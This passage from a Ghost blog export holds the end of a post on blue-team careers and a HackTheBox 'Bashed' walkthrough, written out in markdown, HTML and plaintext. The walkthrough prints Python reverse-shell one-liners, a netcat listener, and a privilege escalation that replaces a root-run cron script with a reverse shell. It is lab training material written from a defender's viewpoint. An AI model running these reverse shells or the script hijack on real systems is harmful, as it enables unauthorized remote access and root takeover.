be a huge benefit to those charged\nwith defending a network. I'd just like to see more people interested in and\nexcited about blue team.\n\nThe requisite gaming analogy\nHave you played Plants vs Zombies  or any other \"tower defense\" game? That's one\nof my favorite analogies when people ask what a blue teamer does. Identify\nimportant areas or assets, stand up multiple layers of defenses, try to\nanticipate what the attacker might do, then adapt and evolve as needed\n(hopefully without being completely overrun at any point!) Sure you need to\nthink like an attacker sometimes, but thinking like a defender is a thing too!\n\nThe pendulum may be starting to swing back the other way, though. With the rise\nof DFIR and threat hunting and the maturation of active or deceptive defense\nstrategies, defenders are devising ways to not only keep their critical systems\nand data safe but also to learn more about attacker methods in the process. I'm\neven more excited when I see tips, tools, and techniques shared with the greater\ninfosec community. The BrakeSec [https://twitter.com/brakesec]  Slack community\nhas been one of my favorite resources lately, lots of smart people sharing ideas\nthere.\n\nThe soapbox message\nWhile this this post started as a bit of a rant about my experience trying to\nfill a seat, I ultimately just want to encourage anyone out there considering a\ncareer in infosec to be open minded. By all means sharpen your hacking skills,\nbut go a step further - set up something like Splunk [https://www.splunk.com/] \nor Graylog [https://www.graylog.org/]  in the lab environment you practice in.\nTake note of the noise/logs you generate when trying to gain access to a system\nand elevate privileges. Think about ways you would automate the detection and\nalerting of such activity. If this kind of detective work interests you,\nconsider a future on the blue team. We need talented people too.","feature_image":"/content/images/2018/03/analytics-3088958_1280.jpg","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-03-30T04:11:59.000Z","created_by":"1","updated_at":"2018-03-30T12:43:13.000Z","updated_by":"1","published_at":"2018-03-30T12:36:10.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":"","codeinjection_foot":"","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5aebd5332d4a58064640a1b8","uuid":"fe1bdfd0-0101-4d15-b95f-c9c6da5bac6a","title":"HackTheBox Writeup: Bashed","slug":"hackthebox-bashed","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"As a career blue teamer I feel it's important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is [HackTheBox](https://hackthebox.eu).\\n\\nThe machine named *Bashed* was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.\\n\\n# Recon\\nAs usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine's IP.\\n\\n```\\nnmap -sC -sV -oA nmap 10.10.10.68\\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST\\nNmap scan report for 10.10.10.68\\nHost is up (0.17s latency).\\nNot shown: 999 closed ports\\nPORT   STATE SERVICE VERSION\\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\\n|_http-server-header: Apache/2.4.18 (Ubuntu)\\n|_http-title: Arrexel's Development Site\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 16.71 seconds\\n```\\n\\n\\nOk, TCP 80 / HTTP is listening.  There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.\\n\\n```\\nnmap --script http-enum 10.10.10.68\\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST\\nNmap scan report for 10.10.10.68\\nHost is up (0.17s latency).\\nNot shown: 999 closed ports\\nPORT   STATE SERVICE\\n80/tcp open  http\\n| http-enum:\\n|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|_  /uploads/: Potentially interesting folder\\nNmap done: 1 IP address (1 host up) scanned in 46.16 seconds\\n```\\n\\nThe /dev directory contains a couple of scripts.  Visiting http://10.10.10.68/dev/phpbash.php in a browser presented me with a web shell (!).  I'm able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.\\n\\n![bashed_user](/content/images/2018/05/bashed_user.png)\\n\\n**user = owned**\\n\\n# Gaining a Foothold\\n\\nI need to get a \\\"real\\\" shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.\\n\\nFirst, I'll need a listener on my local attacker machine:\\n\\n```\\nnc -v -n -l -p 4444\\n```\\n\\nNow I drop this python script directly in the web shell.  The ampersand (&) at the end just backgrounds the process.\\n```\\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"<my HTB IP address>\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' &\\n```\\n\\nNote that the field \\\"my HTB IP address\\\" would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I'm connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.\\n    \\n![bashed_revshell1](/content/images/2018/05/bashed_revshell1.png)\\n    \\nNow I have a reverse shell on the target system, but it's still limited. I try using python again to escape to a bash shell.\\n\\n```\\npython -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\\n```\\n![bashed_revshell2](/content/images/2018/05/bashed_revshell2.png)\\n\\nGreat, now I'm at a more typical shell as user www-data.  Time to enumerate.\\n\\n# Enumeration\\n\\nI checked many many things, but looking at sudo capabilities turned up some useful information.\\n\\n```\\nwww-data@bashed:/var/www/html/dev$ sudo -l\\nsudo -l\\nMatching Defaults entries for www-data on bashed:\\n    env_reset, mail_badpass,\\n    secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin\\nUser www-data may run the following commands on bashed:\\n    (scriptmanager : scriptmanager) NOPASSWD: ALL\\n```\\n\\nSo, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.\\n\\n```\\nwww-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager\\nsudo -i -u scriptmanager\\nscriptmanager@bashed:~$\\n```\\n\\nFrom the [sudo man page](https://www.sudo.ws/man/1.8.3/sudo.man.html):\\n> -i [command]\\nThe -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell's -c option. ==If no command is specified, an interactive shell is executed.== sudo attempts to change to that user's home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.\\n\\nBingo, now I'm scriptmanager.  More enumeration.\\n\\n```\\nscriptmanager@bashed:/var/www/html/dev$ ls -l /\\nls -l /\\ntotal 80\\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin\\ndrwxr-xr-x   3 root          root           4096 Dec  4 11:17 boot\\ndrwxr-xr-x  19 root          root           4240 Jan 12 20:25 dev\\ndrwxr-xr-x  89 root          root           4096 Dec  4 17:09 etc\\ndrwxr-xr-x   4 root          root           4096 Dec  4 13:53 home\\nlrwxrwxrwx   1 root          root             32 Dec  4 11:14 initrd.img -> boot/initrd.img-4.4.0-62-generic\\ndrwxr-xr-x  19 root          root           4096 Dec  4 11:16 lib\\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:13 lib64\\ndrwx------   2 root          root          16384 Dec  4 11:13 lost+found\\ndrwxr-xr-x   4 root          root           4096 Dec  4 11:13 media\\ndrwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt\\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:18 opt\\ndr-xr-xr-x 122 root          root              0 Jan 12 20:24 proc\\ndrwx------   3 root          root           4096 Dec  4 13:03 root\\ndrwxr-xr-x  18 root          root            500 Jan 12 20:25 run\\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:18 sbin\\ndrwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4 18:06 scripts\\ndrwxr-xr-x   2 root          root           4096 Feb 15  2017 srv\\ndr-xr-xr-x  13 root          root              0 Jan 12 20:24 sys\\ndrwxrwxrwt  10 root          root           4096 Jan 12 21:07 tmp\\ndrwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr\\ndrwxr-xr-x  12 root          root           4096 Dec  4 11:20 var\\nlrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -> boot/vmlinuz-4.4.0-62-generic\\n```\\n\\nStrange, ```scripts``` isn't a typical top-level directory and it's owned by scriptmanager. I move into the directory and investigate further.\\n\\n```\\nscriptmanager@bashed:/scripts$ ls -al\\nls -al\\ntotal 16\\ndrwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 20 08:14 .\\ndrwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..\\n-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py\\n-rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt\\n```\\n\\nExamining these two files leads me to believe that ```test.txt``` containts output from the ```test.py``` script.  However,```test.txt``` is owned by root while the directory it resides in and the ```test.py``` script that generates it are owned by scriptmanager.\\n\\nThis implies that root is executing the script as itself, so the output is written with root ownership. If I can replace ```test.py``` with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!\\n\\n# Privilege Escalation\\n\\n```\\nscriptmanager@bashed:/scripts$ mv test.py old-test.py\\nscriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"<my HTB IP address>\\\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' > test.py\\n```\\n\\nHere I moved/renamed the existing ```test.py``` and created my own with the reverse shell code. This isn't necessary, you could just add the reverse shell bits to the end of the existing file.\\n\\nAgain note the \\\"my HTB IP address field\\\" and port number. I want a second reverse shell that's separate from the one I'm currently working in, so I selected a new port (5555).\\n\\nI'm not exactly sure how or when root executes the ```test.py``` script.  Given the autonomous nature of these HTB systems I assume it's just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.\\n\\nAfter a few minutes...\\n\\n![94582eeb-e301-49ba-9bf2-64769b24438c](/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png)\\n\\n**root = owned**\\n\\n# Conclusion\\nLooking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:\\n\\n1. Look at the simple or obvious things first.  Don't assume every target is going to require some elaborate, complicated method to exploit.\\n2. Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code>\\n\\nDid you conquer Bashed using some other method?  Feel free to reach out to me on [Twitter](https://twitter.com/aj_mcquay), I'd love to talk about it.\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>As a career blue teamer I feel it's important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is <a href=\"https://hackthebox.eu\">HackTheBox</a>.</p>\n<p>The machine named <em>Bashed</em> was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.</p>\n<h1 id=\"recon\">Recon</h1>\n<p>As usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine's IP.</p>\n<pre><code>nmap -sC -sV -oA nmap 10.10.10.68\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST\nNmap scan report for 10.10.10.68\nHost is up (0.17s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.71 seconds\n</code></pre>\n<p>Ok, TCP 80 / HTTP is listening.  There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.</p>\n<pre><code>nmap --script http-enum 10.10.10.68\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST\nNmap scan report for 10.10.10.68\nHost is up (0.17s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum:\n|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|_  /uploads/: Potentially interesting folder\nNmap done: 1 IP address (1 host up) scanned in 46.16 seconds\n</code></pre>\n<p>The /dev directory contains a couple of scripts.  Visiting <a href=\"http://10.10.10.68/dev/phpbash.php\">http://10.10.10.68/dev/phpbash.php</a> in a browser presented me with a web shell (!).  I'm able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.</p>\n<p><img src=\"/content/images/2018/05/bashed_user.png\" alt=\"bashed_user\"></p>\n<p><strong>user = owned</strong></p>\n<h1 id=\"gainingafoothold\">Gaining a Foothold</h1>\n<p>I need to get a &quot;real&quot; shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.</p>\n<p>First, I'll need a listener on my local attacker machine:</p>\n<pre><code>nc -v -n -l -p 4444\n</code></pre>\n<p>Now I drop this python script directly in the web shell.  The ampersand (&amp;) at the end just backgrounds the process.</p>\n<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;my HTB IP address&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &amp;\n</code></pre>\n<p>Note that the field &quot;my HTB IP address&quot; would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I'm connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.</p>\n<p><img src=\"/content/images/2018/05/bashed_revshell1.png\" alt=\"bashed_revshell1\"></p>\n<p>Now I have a reverse shell on the target system, but it's still limited. I try using python again to escape to a bash shell.</p>\n<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'\n</code></pre>\n<p><img src=\"/content/images/2018/05/bashed_revshell2.png\" alt=\"bashed_revshell2\"></p>\n<p>Great, now I'm at a more typical shell as user www-data.  Time to enumerate.</p>\n<h1 id=\"enumeration\">Enumeration</h1>\n<p>I checked many many things, but looking at sudo capabilities turned up some useful information.</p>\n<pre><code>www-data@bashed:/var/www/html/dev$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on bashed:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\nUser www-data may run the following commands on bashed:\n    (scriptmanager : scriptmanager) NOPASSWD: ALL\n</code></pre>\n<p>So, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.</p>\n<pre><code>www-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager\nsudo -i -u scriptmanager\nscriptmanager@bashed:~$\n</code></pre>\n<p>From the <a href=\"https://www.sudo.ws/man/1.8.3/sudo.man.html\">sudo man page</a>:</p>\n<blockquote>\n<p>-i [command]<br>\nThe -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell's -c option. <mark>If no command is specified, an interactive shell is executed.</mark> sudo attempts to change to that user's home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.</p>\n</blockquote>\n<p>Bingo, now I'm scriptmanager.  More enumeration.</p>\n<pre><code>scriptmanager@bashed:/var/www/html/dev$ ls -l /\nls -l /\ntotal 80\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin\ndrwxr-xr-x   3 root          root           4096 Dec  4 11:17 boot\ndrwxr-xr-x  19 root          root           4240 Jan 12 20:25 dev\ndrwxr-xr-x  89 root          root           4096 Dec  4 17:09 etc\ndrwxr-xr-x   4 root          root           4096 Dec  4 13:53 home\nlrwxrwxrwx   1 root          root             32 Dec  4 11:14 initrd.img -&gt; boot/initrd.img-4.4.0-62-generic\ndrwxr-xr-x  19 root          root           4096 Dec  4 11:16 lib\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:13 lib64\ndrwx------   2 root          root          16384 Dec  4 11:13 lost+found\ndrwxr-xr-x   4 root          root           4096 Dec  4 11:13 media\ndrwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:18 opt\ndr-xr-xr-x 122 root          root              0 Jan 12 20:24 proc\ndrwx------   3 root          root           4096 Dec  4 13:03 root\ndrwxr-xr-x  18 root          root            500 Jan 12 20:25 run\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:18 sbin\ndrwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4 18:06 scripts\ndrwxr-xr-x   2 root          root           4096 Feb 15  2017 srv\ndr-xr-xr-x  13 root          root              0 Jan 12 20:24 sys\ndrwxrwxrwt  10 root          root           4096 Jan 12 21:07 tmp\ndrwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr\ndrwxr-xr-x  12 root          root           4096 Dec  4 11:20 var\nlrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic\n</code></pre>\n<p>Strange, <code>scripts</code> isn't a typical top-level directory and it's owned by scriptmanager. I move into the directory and investigate further.</p>\n<pre><code>scriptmanager@bashed:/scripts$ ls -al\nls -al\ntotal 16\ndrwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 20 08:14 .\ndrwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..\n-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py\n-rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt\n</code></pre>\n<p>Examining these two files leads me to believe that <code>test.txt</code> containts output from the <code>test.py</code> script.  However,<code>test.txt</code> is owned by root while the directory it resides in and the <code>test.py</code> script that generates it are owned by scriptmanager.</p>\n<p>This implies that root is executing the script as itself, so the output is written with root ownership. If I can replace <code>test.py</code> with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!</p>\n<h1 id=\"privilegeescalation\">Privilege Escalation</h1>\n<pre><code>scriptmanager@bashed:/scripts$ mv test.py old-test.py\nscriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;my HTB IP address&gt;&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt; test.py\n</code></pre>\n<p>Here I moved/renamed the existing <code>test.py</code> and created my own with the reverse shell code. This isn't necessary, you could just add the reverse shell bits to the end of the existing file.</p>\n<p>Again note the &quot;my HTB IP address field&quot; and port number. I want a second reverse shell that's separate from the one I'm currently working in, so I selected a new port (5555).</p>\n<p>I'm not exactly sure how or when root executes the <code>test.py</code> script.  Given the autonomous nature of these HTB systems I assume it's just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.</p>\n<p>After a few minutes...</p>\n<p><img src=\"/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png\" alt=\"94582eeb-e301-49ba-9bf2-64769b24438c\"></p>\n<p><strong>root = owned</strong></p>\n<h1 id=\"conclusion\">Conclusion</h1>\n<p>Looking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:</p>\n<ol>\n<li>Look at the simple or obvious things first.  Don't assume every target is going to require some elaborate, complicated method to exploit.</li>\n<li>Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code></li>\n</ol>\n<p>Did you conquer Bashed using some other method?  Feel free to reach out to me on <a href=\"https://twitter.com/aj_mcquay\">Twitter</a>, I'd love to talk about it.</p>\n</div>","amp":null,"plaintext":"As a career blue teamer I feel it's important to understand the tools,\ntechniques, and thought processes of an attacker. The best way to learn is by\ndoing, and one of my favorite ways to practice is HackTheBox\n[https://hackthebox.eu].\n\nThe machine named Bashed  was recently retired so walkthroughs for it have been\npopping up everywhere. This one is mine.\n\nRecon\nAs usual with a HackTheBox target system, all you have at the onset is a name\nand IP address. My starting point is usually an nmap scan against the target\nmachine's IP.\n\nnmap -sC -sV -oA nmap 10.10.10.68\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST\nNmap scan report for 10.10.10.68\nHost is up (0.17s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.71 seconds\n\n\nOk, TCP 80 / HTTP is listening. There are several options for investigating\nfurther, but before opening a web browser I continued with nmap and ran the\nhttp-enum script.\n\nnmap --script http-enum 10.10.10.68\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST\nNmap scan report for 10.10.10.68\nHost is up (0.17s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum:\n|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|_  /uploads/: Potentially interesting folder\nNmap done: 1 IP address (1 host up) scanned in 46.16 seconds\n\n\nThe /dev directory [VERIFY THIS] contains a couple of scripts. Visiting \nhttp://10.10.10.68/dev/phpbash.php  in a browser presented me with a web shell\n(!). I'm able to navigate the file structure and read the contents of /home.\nGetting user.txt is a simple exercise at this point.\n\n[GET screenshot of web shell navigating to and viewing user.txt]\n\nuser = owned\n\nGaining a Foothold\nI need to get a \"real\" shell on the box to go any further. I choose one of my\nfavorite reverse shell one-liners and see if it will work from the PHP web\nshell.\n\nFirst, I'll need a listener on my local attacker machine:\n\nnc -v -n -l -p 4444\n\n\nNow I drop this python script directly in the web shell. The ampersand (&) at\nthe end just backgrounds the process.\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<my HTB IP address>\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &\n\n\nNote that the field \"my HTB IP address\" would be the 10.10.x.x IP assigned to\nthe VPN interface on my machine (usually tap0 on Kali Linux) when I'm connected\nto the HTB environment, and the port number (4444) is the same one I used to\nstart the netcat listener in the previous step.\n\n[GET screenshot of basic reverse shell]\n\nNow I have a reverse shell on the target system, but it's still limited. I try\nusing python again to escape to a bash shell.\n\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n\n[GET screenshot]\n\nGreat, now I'm at a more typical shell as user www-data. Time to enumerate.\n\nEnumeration\nI checked many many things, but looking at sudo capabilities turned up some\nuseful information.\n\nwww-data@bashed:/var/www/html/dev$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on bashed:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\nUser www-data may run the following commands on bashed:\n    (scriptmanager : scriptmanager) NOPASSWD: ALL\n\n\nSo, my current user (www-data) can run ALL commands as user scriptmanager with\nno password? I decide to try becoming scriptmanager.\n\nwww-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager\nsudo -i -u scriptmanager\nscriptmanager@bashed:~$\n\n\n[EXPLAIN sudo -i]\n\nBingo, now I'm scriptmanager. More enumeration.\n\nscriptmanager@bashed:/var/www/html/dev$ ls -l /\nls -l /\ntotal 80\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin\ndrwxr-xr-x   3 root          root           4096 Dec  4 11:17 boot\ndrwxr-xr-x  19 root          root           4240 Jan 12 20:25 dev\ndrwxr-xr-x  89 root          root           4096 Dec  4 17:09 etc\ndrwxr-xr-x   4 root          root           4096 Dec  4 13:53 home\nlrwxrwxrwx   1 root          root             32 Dec  4 11:14 initrd.img -> boot/initrd.img-4.4.0-62-generic\ndrwxr-xr-x  19 root          root           4096 Dec  4 11:16 lib\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:13 lib64\ndrwx------   2 root          root          16384 Dec  4 11:13 lost+found\ndrwxr-xr-x   4 root          root           4096 Dec  4 11:13 media\ndrwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:18 opt\ndr-xr-xr-x 122 root          root              0 Jan 12 20:24 proc\ndrwx------   3 root          root           4096 Dec  4 13:03 root\ndrwxr-xr-x  18 root          root            500 Jan 12 20:25 run\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:18 sbin\ndrwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4 18:06 scripts\ndrwxr-xr-x   2 root          root           4096 Feb 15  2017 srv\ndr-xr-xr-x  13 root          root              0 Jan 12 20:24 sys\ndrwxrwxrwt  10 root          root           4096 Jan 12 21:07 tmp\ndrwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr\ndrwxr-xr-x  12 root          root           4096 Dec  4 11:20 var\nlrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -> boot/vmlinuz-4.4.0-62-generic\n\n\nStrange, scripts  isn't a typical top-level directory and it's owned by\nscriptmanager. I move into the directory and investigate further.\n\nscriptmanager@bashed:/scripts$ ls -al\nls -al\ntotal 16\ndrwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 20 08:14 .\ndrwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..\n-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py\n-rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt\n\n\nExamining these two files leads me to believe that test.txt  containts output\nfrom the test.py  script. However,test.txt  is owned by root while the directory\nit resides in and the test.py  script that generates it are owned by\nscriptmanager.\n\nThis implies that root is executing the script as itself, so the output is\nwritten with root ownership. If I can replace test.py  with my own malicious\nversion I can do something on the target machine with root privileges. Reverse\nshell time!\n\nscriptmanager@bashed:/scripts$ mv test.py old-test.py\nscriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<my HTB IP address>\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > test.py\n\n\nHere I moved/renamed the existing test.py  and created my own with the reverse\nshell code. This isn't necessary, you could just add the reverse shell bits to\nthe end of the existing file.\n\nAgain note the \"my HTB IP address field\" and port number. I want a second\nreverse shell that's separate from the one I'm currently working in, so I\nselected a new port (5555).\n\nI'm not exactly sure how or when root executes the test.py  script. Given the\nautonomous nature of these HTB systems I assume it's just a cron job. I start a\nnetcat listener on this new port on my local attacker machine and wait.\n\nAfter a few minutes...\n\n\n\nroot = owned","feature_image":"/content/images/2018/05/htb-1.png","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-05-04T03:36:19.000Z","created_by":"1","updated_at":"2018-05-05T02:54:53.000Z","updated_by":"1","published_at":"2018-05-05T02:47:50.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":"","codeinjection_foot":"","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":"Walkthrough of my experience with retired HackTheBox system \"Bashed\".","custom_template":null},{"id":"5c73702abd888c0685801291","uuid":"71d40352-77b4-4c77-89f5-9212174f3aa4","title":"(Untitled)","slug":"untitled","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"></div>","amp":null,"plaintext":"","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-02-25T04:33:46.000Z","created_by":"1","updated_at":"2019-02-25T04:33:46.000Z","updated_by":"1","published_at":null,"published_by":null,"custom_excerpt":null,"codeinjection_head":"","codeinjection_foot":"","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5c737294c9ab231b9b276683","uuid":"20feab19-7ef4-4dcb-b70f-61db783af92c","title":"Koenig 